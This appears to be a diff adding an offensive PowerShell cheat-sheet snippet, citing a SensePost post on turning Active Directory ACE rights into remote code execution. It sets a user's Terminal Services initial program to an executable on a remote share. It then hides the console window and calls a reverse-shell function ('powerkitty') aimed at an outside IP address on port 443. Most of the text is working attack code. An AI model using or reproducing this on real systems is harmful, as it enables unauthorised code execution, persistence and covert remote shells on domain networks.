@@ -1,0 +1,23 @@
+// https://sensepost.com/blog/2020/ace-to-rce/
+
+// Modify User Object
+$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
+$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
+$UserObject.TerminalServicesWorkDirectory = "C:\"
+$UserObject.SetInfo()
+
+// Silently get a reverse shell
+
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+[Console.Window]::ShowWindow($([Console.Window]::GetConsoleWindow()), 0)
+explorer.exe
+Function powerkitty {
+    # ncat for example
+}
+powerkitty -c 161.35.88.182 -p 443 -ep
